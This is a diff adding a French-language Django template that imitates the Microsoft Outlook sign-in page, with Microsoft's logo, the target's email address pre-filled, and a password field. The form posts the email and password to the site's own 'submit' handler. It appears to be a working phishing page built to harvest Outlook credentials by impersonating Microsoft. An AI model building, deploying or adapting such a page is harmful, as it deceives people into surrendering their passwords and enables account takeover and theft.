@@ -1,0 +1,47 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'style1_6.css' %}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="icon" type="image/x-icon" href="{% static 'micro.png' %}">
+    <title>Se connecter à Outlook</title>
+</head>
+<body>
+    <h2  class="titre" style="text-align: center;">Outlook</h2>
+    <form action="{% url 'submit' %}" method="post">
+        {% csrf_token %}
+    <div class="container">
+        <div class="title"><img src="{% static 'Microsoft-logo_rgb_c-gray.webp' %}" alt="" width="200" height="80"></div>
+        <div class="text">
+            <div class="fleche_small">
+                <div class="fleche">
+                    <img src="{% static 'fleche.png' %}" alt="">
+                </div>
+                <small>{{email}}</small>
+            </div>
+            <p>Entrez le mot de passe</p>
+        </div>
+        <div class="form">
+            <input type="hidden" value="{{email}}" name="email">
+            <input type="password" name="password" placeholder="Mot de passe" class="input" >
+            
+        </div>
+        <div class="footer">
+            <small>J'ai oublié mon mot passe?</small>
+           
+        </div>
+        <button type="submit" class="btn">Suivant</button>
+    </div>
+    </form>
+    <div class="option_co">
+        <div class="gau">
+            <img src="{% static 'keys.svg' %}" alt="" width="32" height="32">
+            <p>Options de connexion</p>
+        </div>
+        <div class="droi"></div>
+    </div>
+</body>
+</html>
